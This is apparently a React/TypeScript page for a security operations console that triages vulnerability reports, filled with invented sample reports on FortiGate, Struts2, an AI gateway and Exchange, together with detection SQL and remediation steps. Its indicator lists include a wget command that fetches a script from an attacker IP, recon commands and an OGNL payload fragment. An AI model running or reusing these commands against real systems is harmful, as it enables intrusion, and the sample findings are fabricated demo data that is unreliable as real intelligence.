import { useRef, useState } from 'react';
import { useSearchParams } from 'react-router-dom';
import {
  Bug,
  CheckCircle2,
  ChevronRight,
  Database,
  FileText,
  ListChecks,
  Network,
  Search,
  ShieldAlert,
  TerminalSquare,
  Upload,
  X,
} from 'lucide-react';
import PageHeader from '@/components/common/PageHeader';
import { Badge, Card, ConfigWorkshop, ModeSwitch } from './components';

const vulnerabilityReports = [
  {
    id: 'VUL-2026-0614-001',
    title: 'Fortinet SSL-VPN 远程代码执行漏洞爆发报告',
    file: 'Fortinet_SSLVPN_RCE_Exploitation_Report.pdf',
    source: '厂商通告 / CISA KEV / 威胁情报',
    category: '新漏洞爆发',
    severity: '高危',
    receivedAt: '2026-06-14 09:20',
    vulnerability: 'CVE-2026-17720',
    target: 'FortiGate SSL-VPN',
    summary: '报告描述攻击者利用 FortiGate SSL-VPN Web 管理与远程接入组件中的内存破坏漏洞执行命令，并通过异常 Web 请求触发设备回连。排查重点为 FortiOS 7.0.x/7.2.x 受影响版本、SSL-VPN 开启状态、异常管理路径访问、设备 shell 命令执行痕迹和出口连接。',
    extracted: {
      product: ['FortiGate', 'FortiOS', 'SSL-VPN'],
      component: ['sslvpnd', 'httpsd', 'remote access portal'],
      version: ['FortiOS 7.0.0-7.0.16', 'FortiOS 7.2.0-7.2.8'],
      command: ['diag debug crashlog read', 'execute ping 45.83.12.21', 'wget http://45.83.12.21/f.sh -O /tmp/f.sh'],
      traffic: ['POST /remote/logincheck', 'GET /remote/hostcheck_validate', 'dst_port=443 AND ua contains python-requests'],
      poc: ['无破坏性版本指纹验证', 'SSL-VPN portal path probe', '管理接口响应头版本比对'],
    },
    affectedAssets: [
      { asset: 'VPN-HZ-01', ip: '10.10.44.18', owner: '网络安全组', exposure: '公网 203.0.113.18:443', product: 'FortiGate 200F', version: 'FortiOS 7.2.5', evidence: 'CMDB 版本命中；WAF/边界日志 17 次命中 /remote/hostcheck_validate；NDR 发现 1 次到 45.83.12.21:80 出站连接', status: '确认受影响' },
      { asset: 'VPN-BJ-02', ip: '10.21.8.44', owner: '北京办公网', exposure: '公网 198.51.100.42:443', product: 'FortiGate 100F', version: 'FortiOS 7.4.3', evidence: '版本不在影响范围；过去 14 天未命中漏洞路径；仅保留基线复核', status: '未命中' },
      { asset: 'VPN-SH-DR', ip: '10.32.4.9', owner: '灾备网络组', exposure: '内网', product: 'FortiGate VM', version: 'FortiOS 7.0.12', evidence: '版本命中但未暴露公网；FW 无外部访问记录；建议补丁窗口内升级', status: '需修复' },
    ],
    queries: [
      { source: 'CMDB', sql: "SELECT asset, ip, version FROM assets WHERE product LIKE '%FortiGate%' AND version BETWEEN '7.0.0' AND '7.2.8'", result: '命中 VPN-HZ-01、VPN-SH-DR；VPN-HZ-01 暴露公网' },
      { source: 'NDR', sql: "SELECT src_ip,dst_ip,dst_port FROM flows WHERE src_asset='VPN-HZ-01' AND dst_ip IN ('45.83.12.21','198.235.24.44') AND time>=now()-interval '14 day'", result: 'VPN-HZ-01 命中 1 条到 45.83.12.21:80 出站连接' },
      { source: 'FW', sql: "SELECT policy,src_ip,dst_ip,action FROM fw_logs WHERE dst_asset IN ('VPN-HZ-01','VPN-SH-DR') AND uri LIKE '/remote/%'", result: 'VPN-HZ-01 命中 23 条公网访问；VPN-SH-DR 0 条公网访问' },
      { source: '设备日志', sql: "SELECT asset,cmd,time FROM device_cli_logs WHERE asset LIKE 'VPN-%' AND cmd LIKE '%wget%'", result: '未发现 wget/curl 落地命令；VPN-HZ-01 存在 2 条异常 crashlog' },
    ],
    conclusion: 'VPN-HZ-01 同时满足公网暴露、版本命中、漏洞路径访问和异常出站连接四类证据，应按已受影响资产优先隔离验证。VPN-SH-DR 版本受影响但无外部触达证据，进入补丁修复队列。',
    recommendations: ['临时限制 VPN-HZ-01 管理与 SSL-VPN 入口来源', '立即升级 VPN-HZ-01 与 VPN-SH-DR FortiOS', '保全 VPN-HZ-01 设备日志、会话日志和崩溃日志', '对 45.83.12.21 加入 FW 阻断并回溯账号登录'],
  },
  {
    id: 'VUL-2026-0614-002',
    title: 'Apache Struts OGNL 历史漏洞暴露面复盘报告',
    file: 'Apache_Struts_OGNL_Deep_Dive_Report.pdf',
    source: '历史漏洞深度分析 / 内部复盘',
    category: '历史漏洞深度分析',
    severity: '中高',
    receivedAt: '2026-06-14 10:45',
    vulnerability: 'CVE-2017-5638 / S2-045',
    target: 'Apache Struts2',
    summary: '报告复盘 Struts2 Jakarta Multipart parser OGNL 注入漏洞在老旧 Java 应用中的长期残留风险。排查重点为 struts2-core 2.3.x/2.5.10 以下版本、Content-Type OGNL payload、Tomcat 启动参数、war 包依赖和历史 WAF 拦截记录。',
    extracted: {
      product: ['Apache Struts2', 'Tomcat', 'Java Web'],
      component: ['struts2-core', 'Jakarta Multipart parser', 'xwork-core'],
      version: ['struts2-core 2.3.5-2.3.31', 'struts2-core 2.5.0-2.5.10'],
      command: ['java -jar legacy-portal.jar', 'catalina.sh run', 'id;whoami;uname -a'],
      traffic: ['Content-Type contains %{(#_memberAccess', 'POST /upload.action', 'multipart/form-data OGNL payload'],
      poc: ['Content-Type 无害表达式回显验证', '依赖包版本扫描', '上传接口路由验证'],
    },
    affectedAssets: [
      { asset: 'OA-LEGACY-01', ip: '10.18.6.21', owner: '协同办公组', exposure: '内网', product: 'Tomcat 8 + Struts2', version: 'struts2-core-2.3.24.jar', evidence: 'HIDS 在 /opt/oa/WEB-INF/lib 命中 struts2-core-2.3.24.jar；WAF 历史 42 条 OGNL 拦截；EDR 未发现命令执行子进程', status: '确认存在漏洞' },
      { asset: 'HR-PORTAL-02', ip: '10.18.7.33', owner: '人力系统组', exposure: 'VPN 后访问', product: 'Spring MVC', version: '未发现 Struts', evidence: 'SBOM 未命中 struts2-core；WAF 路径 /upload.action 属正常上传接口但无 OGNL 命中', status: '未命中' },
      { asset: 'BILLING-OLD-01', ip: '10.24.3.18', owner: '账务系统组', exposure: '内网', product: 'Tomcat 7 + Struts2', version: 'struts2-core-2.5.8.jar', evidence: 'SBOM 命中受影响版本；服务已停用但进程仍监听 8080；无近 30 天业务访问', status: '需下线' },
    ],
    queries: [
      { source: 'SBOM', sql: "SELECT host,artifact,version FROM java_dependencies WHERE artifact='struts2-core' AND version < '2.5.10.1'", result: '命中 OA-LEGACY-01、BILLING-OLD-01' },
      { source: 'HIDS', sql: "SELECT host,path,sha1 FROM files WHERE path LIKE '%WEB-INF/lib/struts2-core%'", result: 'OA-LEGACY-01 命中 2.3.24；BILLING-OLD-01 命中 2.5.8' },
      { source: 'WAF', sql: "SELECT host,count(*) FROM waf_logs WHERE header_content_type LIKE '%_memberAccess%' AND time>=now()-interval '180 day' GROUP BY host", result: 'OA-LEGACY-01 42 条；BILLING-OLD-01 3 条' },
      { source: 'EDR', sql: "SELECT host,parent,child FROM process WHERE parent LIKE '%java%' AND child IN ('sh','bash','cmd.exe')", result: '未发现 java 拉起 shell/cmd' },
    ],
    conclusion: 'OA-LEGACY-01 和 BILLING-OLD-01 存在明确受影响 Struts2 组件，其中 OA-LEGACY-01 有持续探测证据但暂无命令执行证据；BILLING-OLD-01 应作为遗留暴露面下线。',
    recommendations: ['升级或替换 OA-LEGACY-01 Struts2 依赖', '下线 BILLING-OLD-01 残留监听服务', '保留 180 天 WAF OGNL 拦截样本', '对 Java 进程子进程行为继续监控 7 天'],
  },
  {
    id: 'VUL-2026-0614-003',
    title: 'AI 网关未编号认证绕过模糊情报排查报告',
    file: 'AI_Gateway_Auth_Bypass_Unnumbered_Report.pdf',
    source: '灰度情报 / 社区 PoC / 厂商预警',
    category: '无编号模糊漏洞',
    severity: '高危',
    receivedAt: '2026-06-14 11:30',
    vulnerability: '未分配 CVE',
    target: 'AI Gateway / Model Router',
    summary: '报告描述部分 AI 网关在启用多租户路由时，对 X-Workspace-Id 与 Authorization 绑定校验不足，攻击者可能越权调用其他租户模型或读取提示词模板。排查重点为网关产品名、路由组件版本、启动参数 multi_tenant=true、异常 X-Workspace-Id、跨租户 200 响应和 API Key 使用轨迹。',
    extracted: {
      product: ['AI Gateway', 'Model Router', 'LLM Proxy'],
      component: ['tenant-router', 'prompt-template-service', 'apikey-auth-middleware'],
      version: ['ai-gateway 1.8.0-1.8.4', 'model-router 0.9.x'],
      command: ['ai-gateway --multi-tenant=true --auth-mode=apikey', 'docker run ai-gateway:1.8.3', 'kubectl logs deploy/ai-gateway'],
      traffic: ['X-Workspace-Id mismatch', 'POST /v1/chat/completions', 'GET /api/prompts/templates', 'HTTP 200 with foreign tenant id'],
      poc: ['租户绑定校验 PoC', '只读 prompt template 越权验证', 'API key scope comparison'],
    },
    affectedAssets: [
      { asset: 'AI-GW-HZ-01', ip: '10.30.18.11', owner: 'AI 平台组', exposure: '内网 API', product: 'ai-gateway', version: '1.8.3', evidence: 'CMDB/SBOM 版本命中；K8s 启动参数 multi-tenant=true；API 日志 9 条 X-Workspace-Id 与 token tenant 不一致且返回 200', status: '确认受影响' },
      { asset: 'AI-GW-BJ-02', ip: '10.31.4.19', owner: 'AI 平台组', exposure: '内网 API', product: 'ai-gateway', version: '1.9.1', evidence: '版本不在影响范围；API 日志 0 条租户不一致；配置 auth.bind_workspace=true', status: '未命中' },
      { asset: 'MODEL-ROUTER-DEV', ip: '10.60.8.91', owner: '研发测试环境', exposure: '测试网段', product: 'model-router', version: '0.9.7', evidence: '组件版本命中；测试环境存在匿名 key；未接入生产模型', status: '关注' },
    ],
    queries: [
      { source: 'CMDB/SBOM', sql: "SELECT asset,version FROM services WHERE product IN ('ai-gateway','model-router') AND version IN ('1.8.0','1.8.1','1.8.2','1.8.3','1.8.4','0.9.7')", result: '命中 AI-GW-HZ-01、MODEL-ROUTER-DEV' },
      { source: 'K8s 日志', sql: "SELECT pod,args FROM k8s_workloads WHERE args LIKE '%multi-tenant=true%'", result: 'AI-GW-HZ-01 命中 --multi-tenant=true --auth-mode=apikey' },
      { source: 'API 网关日志', sql: "SELECT asset,count(*) FROM api_logs WHERE header_workspace_id != token_tenant AND status=200 GROUP BY asset", result: 'AI-GW-HZ-01 命中 9 条跨租户 200；AI-GW-BJ-02 0 条' },
      { source: '审计库', sql: "SELECT key_id,scope,last_used FROM api_keys WHERE scope='*' OR anonymous=true", result: 'MODEL-ROUTER-DEV 存在 anonymous=true 测试 key 1 个' },
    ],
    conclusion: 'AI-GW-HZ-01 具备版本、配置和跨租户成功响应三类证据，判定为受影响；MODEL-ROUTER-DEV 虽为测试环境，也存在弱授权配置，应同步加固。',
    recommendations: ['立即开启 auth.bind_workspace=true', '吊销 AI-GW-HZ-01 高权限 API Key 并轮换密钥', '封存 9 条跨租户访问审计记录', '对 MODEL-ROUTER-DEV 禁用匿名 key'],
  },
  {
    id: 'VUL-2026-0614-004',
    title: 'Microsoft Exchange SSRF/RCE 历史漏洞复核报告',
    file: 'Exchange_ProxyShell_ProxyNotShell_Review.pdf',
    source: '历史漏洞复测 / 邮件安全专题',
    category: '历史漏洞深度分析',
    severity: '中高',
    receivedAt: '2026-06-14 14:05',
    vulnerability: 'CVE-2021-34473 / CVE-2022-41040',
    target: 'Microsoft Exchange',
    summary: '报告聚焦 Exchange ProxyShell 与 ProxyNotShell 类漏洞在历史邮件服务器中的补丁残留与 WebShell 落地风险。排查重点为 Exchange CU 版本、Autodiscover/EWS 异常请求、PowerShell 远程调用、w3wp.exe 子进程、aspnet_client 目录写入和外联 C2。',
    extracted: {
      product: ['Microsoft Exchange Server', 'IIS'],
      component: ['Autodiscover', 'EWS', 'PowerShell Remoting', 'aspnet_client'],
      version: ['Exchange 2016 CU18-CU21', 'Exchange 2019 CU9-CU11'],
      command: ['w3wp.exe -> powershell.exe', 'New-MailboxExportRequest', 'cmd.exe /c whoami'],
      traffic: ['POST /autodiscover/autodiscover.json', 'X-BEResource cookie', 'POST /powershell/'],
      poc: ['补丁版本比对', 'Autodiscover SSRF 探测', 'WebShell Hash 检索'],
    },
    affectedAssets: [
      { asset: 'MAIL-HZ-01', ip: '10.8.1.25', owner: '邮件平台组', exposure: '公网 mail.example.com', product: 'Exchange 2016', version: 'CU20', evidence: '版本落入历史影响范围；WAF 30 天 11 条 Autodiscover 异常请求；HIDS 未发现新增 aspx；EDR 未发现 w3wp 拉起 powershell', status: '需补丁确认' },
      { asset: 'MAIL-BJ-DR', ip: '10.8.5.17', owner: '邮件平台组', exposure: '内网灾备', product: 'Exchange 2019', version: 'CU13', evidence: '版本已修复；无公网暴露；仅同步检查 IIS 目录', status: '未命中' },
      { asset: 'MAIL-ARCHIVE-OLD', ip: '10.8.9.31', owner: '归档系统组', exposure: '内网', product: 'Exchange 2016', version: 'CU19', evidence: '服务停用但 IIS 站点仍运行；HIDS 命中 aspnet_client/shell.aspx 历史隔离记录 1 条', status: '关注' },
    ],
    queries: [
      { source: 'CMDB', sql: "SELECT asset,version,exposure FROM assets WHERE product LIKE '%Exchange%'", result: '命中 MAIL-HZ-01、MAIL-BJ-DR、MAIL-ARCHIVE-OLD' },
      { source: 'WAF', sql: "SELECT dst,count(*) FROM waf_logs WHERE uri LIKE '/autodiscover/%' AND headers LIKE '%X-BEResource%' GROUP BY dst", result: 'MAIL-HZ-01 11 条；MAIL-ARCHIVE-OLD 0 条' },
      { source: 'HIDS', sql: "SELECT host,path,event FROM file_events WHERE path LIKE '%aspnet_client%' AND ext='aspx'", result: 'MAIL-ARCHIVE-OLD 命中隔离记录 shell.aspx；MAIL-HZ-01 未命中' },
      { source: 'EDR', sql: "SELECT host,parent,child FROM process WHERE parent='w3wp.exe' AND child IN ('powershell.exe','cmd.exe')", result: 'Exchange 主机均未命中' },
    ],
    conclusion: 'MAIL-HZ-01 仍需确认补丁状态并限制 Autodiscover 暴露；MAIL-ARCHIVE-OLD 存在历史 WebShell 隔离记录，应做离线取证和站点下线。',
    recommendations: ['核查 MAIL-HZ-01 Exchange CU 和安全补丁', '对 Autodiscover 异常请求源 IP 加入观察列表', '下线 MAIL-ARCHIVE-OLD IIS 站点', '复核 aspnet_client 历史隔离文件 Hash'],
  },
];

type VulnerabilityReport = typeof vulnerabilityReports[number];

export default function SocVulnerabilitiesPage() {
  const [params] = useSearchParams();
  const isConfigure = params.get('mode') === 'configure';

  return (
    <div className="h-full overflow-y-auto">
      <PageHeader
        title="漏洞排查"
        description="上传漏洞报告或输入 CVE，读取微步情报并自动排查影响资产。"
        icon={<Bug className="h-8 w-8" />}
        action={<ModeSwitch configureHref="/soc/vulnerabilities?mode=configure" />}
      />

      {isConfigure ? <ConfigWorkshop scenario="vulnerabilities" /> : <VulnerabilityOperation />}
    </div>
  );
}

function VulnerabilityOperation() {
  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const [reports, setReports] = useState<VulnerabilityReport[]>(vulnerabilityReports);
  const [selectedReport, setSelectedReport] = useState<VulnerabilityReport | null>(null);
  const [cveInput, setCveInput] = useState('CVE-2026-18411');

  const handleUploadReport = (file: File) => {
    const title = file.name
      .replace(/\.(pdf|docx?|txt)$/i, '')
      .replace(/[_-]+/g, ' ')
      .replace(/\s+/g, ' ')
      .trim();
    const uploadedReport: VulnerabilityReport = {
      ...vulnerabilityReports[2],
      id: `VUL-2026-0614-U${String(reports.filter((report) => report.id.includes('-U')).length + 1).padStart(2, '0')}`,
      title: `${title || '人工上传漏洞报告'} 影响面排查`,
      file: file.name,
      source: '人工上传 / 微步 MCP 补充情报',
      category: '无编号模糊漏洞',
      receivedAt: '2026-06-14 16:30',
      summary: `已解析人工上传的漏洞报告 ${file.name}，并从微步 MCP 补充漏洞背景、影响产品、组件版本、PoC 状态和在野利用情报，随后生成企业内部影响面排查结果。`,
    };
    setReports((current) => [uploadedReport, ...current]);
    setSelectedReport(uploadedReport);
  };

  const handleCveSubmit = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    const normalizedCve = cveInput.trim().toUpperCase();
    if (!normalizedCve) return;
    const cveReport: VulnerabilityReport = {
      ...vulnerabilityReports[0],
      id: `VUL-2026-0614-C${String(reports.filter((report) => report.id.includes('-C')).length + 1).padStart(2, '0')}`,
      title: `${normalizedCve} 微步情报影响面排查报告`,
      file: `${normalizedCve}_ThreatBook_MCP_Intel.json`,
      source: 'CVE 输入 / 微步 MCP 漏洞情报',
      category: '新漏洞爆发',
      receivedAt: '2026-06-14 16:35',
      vulnerability: normalizedCve,
      summary: `用户输入 ${normalizedCve} 后，系统从微步 MCP 读取漏洞情报，补全漏洞描述、受影响产品、版本范围、PoC 与在野利用状态，并基于企业 CMDB、SBOM、HIDS、WAF、FW、NDR、EDR 数据库执行完整影响面调查。`,
    };
    setReports((current) => [cveReport, ...current]);
    setSelectedReport(cveReport);
  };

  return (
    <div className="space-y-4">
      <Card className="p-4">
        <div className="mb-3 flex items-center gap-2">
          <ShieldAlert className="h-5 w-5 text-red-600" />
          <h3 className="font-semibold text-gray-900">启动漏洞影响面调查</h3>
        </div>
        <div className="grid grid-cols-1 gap-3 lg:grid-cols-[0.95fr_1.05fr]">
          <div className="rounded-lg border border-dashed border-gray-300 bg-gray-50 p-4">
            <div className="text-sm font-semibold text-gray-900">上传漏洞报告</div>
            <p className="mt-1 text-xs leading-5 text-gray-500">支持厂商通告、CERT 报告和无编号漏洞线索。</p>
            <input
              ref={fileInputRef}
              type="file"
              accept=".pdf,.doc,.docx,.txt,application/pdf"
              className="hidden"
              onChange={(event) => {
                const file = event.target.files?.[0];
                if (file) handleUploadReport(file);
                event.target.value = '';
              }}
            />
            <button
              type="button"
              onClick={() => fileInputRef.current?.click()}
              className="mt-3 inline-flex items-center gap-2 rounded-lg bg-gray-900 px-3 py-2 text-xs font-medium text-white hover:bg-gray-800"
            >
              <Upload className="h-3.5 w-3.5" />
              选择报告文件
            </button>
          </div>
          <form onSubmit={handleCveSubmit} className="rounded-lg border border-gray-200 bg-white p-4">
            <div className="text-sm font-semibold text-gray-900">输入 CVE 编号</div>
            <p className="mt-1 text-xs leading-5 text-gray-500">读取微步情报，自动生成排查条件。</p>
            <div className="mt-3 flex flex-col gap-2 sm:flex-row">
              <input
                value={cveInput}
                onChange={(event) => setCveInput(event.target.value)}
                className="min-w-0 flex-1 rounded-lg border border-gray-200 px-3 py-2 font-mono text-sm text-gray-800 outline-none focus:border-red-300 focus:ring-2 focus:ring-red-100"
                placeholder="CVE-2026-18411"
              />
              <button
                type="submit"
                className="inline-flex items-center justify-center gap-2 rounded-lg bg-red-600 px-4 py-2 text-sm font-medium text-white hover:bg-red-700"
              >
                <Search className="h-4 w-4" />
                开始调查
              </button>
            </div>
          </form>
        </div>
      </Card>

      <Card className="p-4">
        <div className="mb-3 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <FileText className="h-5 w-5 text-red-600" />
            <h3 className="font-semibold text-gray-900">漏洞报告列表</h3>
          </div>
          <Badge tone="blue">{reports.length} 份报告</Badge>
        </div>
        <div className="space-y-2">
          {reports.map((report) => {
            const affectedCount = report.affectedAssets.filter((asset) => asset.status !== '未命中').length;
            return (
              <button
                key={report.id}
                type="button"
                onClick={() => setSelectedReport(report)}
                className={`w-full rounded-lg border p-3 text-left transition-colors ${
                  selectedReport?.id === report.id
                    ? 'border-red-200 bg-red-50'
                    : 'border-gray-200 bg-gray-50 hover:border-gray-300 hover:bg-white'
                }`}
              >
                <div className="flex flex-wrap items-start justify-between gap-3">
                  <div>
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="text-sm font-semibold text-gray-900">{report.title}</span>
                      <Badge tone={report.category === '新漏洞爆发' ? 'red' : report.category === '无编号模糊漏洞' ? 'purple' : 'orange'}>
                        {report.category}
                      </Badge>
                    </div>
                    <div className="mt-1 text-xs text-gray-500">{report.file} · {report.source} · {report.receivedAt}</div>
                  </div>
                  <div className="flex items-center gap-2">
                    <Badge tone={report.severity === '高危' ? 'red' : 'orange'}>{report.severity}</Badge>
                    <Badge tone={affectedCount > 0 ? 'orange' : 'slate'}>{affectedCount} 台需处理</Badge>
                  </div>
                </div>
                <p className="mt-2 line-clamp-2 text-xs leading-5 text-gray-600">{report.summary}</p>
              </button>
            );
          })}
        </div>
      </Card>

      {selectedReport && <VulnerabilityReportDrawer report={selectedReport} onClose={() => setSelectedReport(null)} />}
    </div>
  );
}

function VulnerabilityReportDrawer({ report, onClose }: { report: VulnerabilityReport; onClose: () => void }) {
  const [stepsOpen, setStepsOpen] = useState(false);
  const featureRows = [
    ['产品名', report.extracted.product],
    ['组件名', report.extracted.component],
    ['版本号', report.extracted.version],
    ['启动/命令特征', report.extracted.command],
    ['流量特征', report.extracted.traffic],
    ['PoC 验证方式', report.extracted.poc],
  ] as const;
  const confirmedAssets = report.affectedAssets.filter((asset) => ['确认受影响', '确认存在漏洞'].includes(asset.status));
  const watchAssets = report.affectedAssets.filter((asset) => ['关注', '需修复', '需下线', '需补丁确认'].includes(asset.status));
  const steps = [
    {
      title: '解析漏洞报告',
      content: `读取 ${report.file}，识别漏洞主题、编号状态、影响产品、受影响版本、攻击链描述和验证条件。`,
      facts: [
        `报告标题：${report.title}`,
        `漏洞编号：${report.vulnerability}；漏洞对象：${report.target}；严重性：${report.severity}`,
        `报告类型：${report.category}；来源：${report.source}`,
      ],
    },
    {
      title: '读取微步 MCP 漏洞情报',
      content: `以 ${report.vulnerability}、${report.target} 和报告标题为检索条件，从微步 MCP 查询漏洞画像、在野利用、PoC 状态、影响版本和处置优先级。`,
      facts: [
        `微步 MCP 返回漏洞名称：${report.vulnerability} / ${report.target}`,
        `影响产品：${report.extracted.product.join('，')}；核心组件：${report.extracted.component.join('，')}`,
        `影响版本：${report.extracted.version.join('，')}`,
        `PoC/验证线索：${report.extracted.poc.join('，')}`,
        `情报判断：${report.severity === '高危' ? '存在高危利用风险，建议优先排查公网和核心业务资产' : '存在持续探测或历史残留风险，建议结合资产暴露面排序排查'}`,
      ],
    },
    {
      title: '提取排查特征',
      content: '从报告正文和附录中提取可落地查询的特征，包括产品名、组件名、版本号、启动命令、命令行片段、流量特征和 PoC 验证条件。',
      facts: featureRows.map(([label, values]) => `${label}：${values.join('，')}`),
    },
    {
      title: 'text2sql 资产与组件排查',
      content: '将产品、组件和版本条件转成 text2sql，查询 CMDB、SBOM、HIDS 文件清单、K8s 工作负载和设备清单，定位可能受影响资产。',
      facts: report.queries
        .filter((query) => ['CMDB', 'CMDB/SBOM', 'SBOM', 'HIDS', 'K8s 日志'].includes(query.source))
        .map((query) => `${query.source}：${query.sql}；结果：${query.result}`),
    },
    {
      title: 'text2sql 日志与流量回溯',
      content: '将 IP、路径、Header、命令行、父子进程和 PoC 特征转成 text2sql，查询 NDR、WAF、FW、EDR、设备日志、API 网关日志和审计库，判断漏洞是否被触达或利用。',
      facts: report.queries
        .filter((query) => !['CMDB', 'CMDB/SBOM', 'SBOM', 'HIDS', 'K8s 日志'].includes(query.source))
        .map((query) => `${query.source}：${query.sql}；结果：${query.result}`),
    },
    {
      title: '生成排查结论',
      content: '汇总资产命中、日志证据、未命中范围和仍需验证的点，形成修复优先级和处置建议。',
      facts: [
        `确认受影响资产 ${confirmedAssets.length} 台：${confirmedAssets.map((asset) => asset.asset).join('，') || '无'}`,
        `需关注/修复资产 ${watchAssets.length} 台：${watchAssets.map((asset) => `${asset.asset}(${asset.status})`).join('，') || '无'}`,
        `结论：${report.conclusion}`,
        `建议：${report.recommendations.join('；')}`,
      ],
    },
  ];

  return (
    <div className="fixed inset-0 z-[70]">
      <button type="button" className="absolute inset-0 bg-slate-900/25" onClick={onClose} aria-label="关闭漏洞报告" />
      <aside className="absolute inset-y-0 right-0 flex w-full flex-col bg-white shadow-2xl sm:w-[82%]">
        <div className="flex items-center justify-between border-b border-gray-200 px-5 py-3">
          <div className="flex items-center gap-2.5">
            <ShieldAlert className="h-5 w-5 text-gray-900" />
            <div>
              <div className="text-base font-semibold text-gray-900">漏洞影响排查</div>
              <div className="text-xs text-gray-500">{report.id} · {report.file}</div>
            </div>
          </div>
          <button type="button" onClick={onClose} className="rounded-lg p-1.5 text-gray-400 hover:bg-gray-100 hover:text-gray-600">
            <X className="h-4 w-4" />
          </button>
        </div>

        <div className="flex-1 overflow-y-auto px-5 py-4">
          <button
            type="button"
            onClick={() => setStepsOpen((open) => !open)}
            className="mb-5 flex w-full items-center justify-between rounded-lg border border-gray-200 bg-white px-5 py-3 text-left shadow-sm"
          >
            <div className="flex items-center gap-4">
              <span className="text-base font-semibold text-gray-900">排查过程</span>
              <span className="text-sm text-gray-500">{steps.length} 个步骤</span>
            </div>
            <span className="inline-flex items-center gap-2 text-xs font-medium text-gray-600">
              {stepsOpen ? '收起' : '展开查看'}
              <ChevronRight className={`h-4 w-4 transition-transform ${stepsOpen ? '-rotate-90' : 'rotate-90'}`} />
            </span>
          </button>

          {stepsOpen && (
            <div className="mb-6 border-l border-gray-200 pl-5">
              {steps.map((step) => (
                <div key={step.title} className="relative mb-5 last:mb-0">
                  <div className="absolute -left-[29px] top-1 flex h-4 w-4 items-center justify-center rounded-full bg-gray-900 text-white">
                    <CheckCircle2 className="h-3 w-3" />
                  </div>
                  <h3 className="text-base font-semibold text-gray-900">{step.title}</h3>
                  <p className="mt-2 text-sm leading-6 text-gray-700">{step.content}</p>
                  <ul className="mt-2 list-disc space-y-1 pl-5 text-sm leading-6 text-gray-700">
                    {step.facts.map((fact) => <li key={fact}>{fact}</li>)}
                  </ul>
                </div>
              ))}
            </div>
          )}

          <article className="pb-10">
            <div className="mb-3 flex flex-wrap items-center gap-3 text-sm">
              <span>{report.receivedAt}</span>
              <Badge tone={report.severity === '高危' ? 'red' : 'orange'}>{report.severity}</Badge>
              <Badge tone={report.category === '新漏洞爆发' ? 'red' : report.category === '无编号模糊漏洞' ? 'purple' : 'orange'}>
                {report.category}
              </Badge>
              <span className="text-gray-500">{report.source}</span>
            </div>
            <h1 className="text-2xl font-bold text-gray-950">{report.title}</h1>
            <p className="mt-3 text-sm leading-7 text-gray-700">{report.summary}</p>

            <SectionTitle icon={<ListChecks className="h-4 w-4" />} title="漏洞排查特征" />
            <div className="rounded-lg bg-gray-50 px-4 py-3 text-sm leading-7 text-gray-700">
              {featureRows.map(([label, values]) => (
                <div key={label} className="flex gap-3 border-b border-gray-100 py-1.5 last:border-0">
                  <div className="w-28 shrink-0 font-semibold text-gray-900">{label}</div>
                  <div className="font-mono text-xs leading-7 text-gray-700">{values.join('，')}</div>
                </div>
              ))}
            </div>

            <SectionTitle icon={<Database className="h-4 w-4" />} title="排查到的资产" />
            <div className="overflow-x-auto rounded-lg border border-gray-200">
              <table className="min-w-[1180px] divide-y divide-gray-200">
                <thead className="bg-gray-50">
                  <tr>
                    {['资产', 'IP', '归属', '暴露面', '产品/版本', '证据', '状态'].map((header) => (
                      <th key={header} className="px-4 py-2.5 text-left text-xs font-semibold text-gray-500">{header}</th>
                    ))}
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-100 bg-white">
                  {report.affectedAssets.map((asset) => (
                    <tr key={asset.asset}>
                      <td className="px-4 py-3 text-sm font-semibold text-gray-900">{asset.asset}</td>
                      <td className="px-4 py-3 font-mono text-xs text-gray-700">{asset.ip}</td>
                      <td className="px-4 py-3 text-sm text-gray-600">{asset.owner}</td>
                      <td className="px-4 py-3 text-sm text-gray-600">{asset.exposure}</td>
                      <td className="px-4 py-3 text-sm text-gray-600">{asset.product} / {asset.version}</td>
                      <td className="px-4 py-3 text-sm leading-6 text-gray-600">{asset.evidence}</td>
                      <td className="px-4 py-3">
                        <Badge tone={asset.status.includes('确认') ? 'red' : asset.status === '未命中' ? 'slate' : 'orange'}>
                          {asset.status}
                        </Badge>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            <SectionTitle icon={<TerminalSquare className="h-4 w-4" />} title="text2sql 查询证据" />
            <div className="space-y-2">
              {report.queries.map((query) => (
                <div key={`${query.source}-${query.sql}`} className="rounded-lg border border-gray-200 bg-white px-4 py-3">
                  <div className="mb-2 flex items-center gap-2">
                    <Badge tone="blue">{query.source}</Badge>
                    <span className="text-sm font-medium text-gray-900">{query.result}</span>
                  </div>
                  <pre className="overflow-x-auto rounded-md bg-gray-50 px-3 py-2 font-mono text-xs leading-5 text-gray-700">{query.sql}</pre>
                </div>
              ))}
            </div>

            <SectionTitle icon={<Network className="h-4 w-4" />} title="排查结论和建议" />
            <div className="rounded-lg bg-red-50 px-4 py-3 text-sm leading-7 text-gray-700">
              <p className="font-semibold text-gray-900">{report.conclusion}</p>
              <ol className="mt-2 list-decimal space-y-1 pl-5">
                {report.recommendations.map((item) => <li key={item}>{item}</li>)}
              </ol>
            </div>
          </article>
        </div>

        <div className="flex justify-end gap-3 border-t border-gray-200 px-5 py-3">
          <button type="button" onClick={onClose} className="rounded-lg border border-gray-200 px-4 py-2 text-sm font-medium text-gray-700 hover:bg-gray-50">
            关闭
          </button>
          <button type="button" className="rounded-lg bg-red-600 px-4 py-2 text-sm font-medium text-white hover:bg-red-700">
            生成修复任务
          </button>
        </div>
      </aside>
    </div>
  );
}

function SectionTitle({ icon, title }: { icon: React.ReactNode; title: string }) {
  return (
    <div className="mb-3 mt-7 flex items-center gap-2">
      <span className="text-red-600">{icon}</span>
      <h2 className="text-lg font-bold text-gray-950">{title}</h2>
    </div>
  );
}
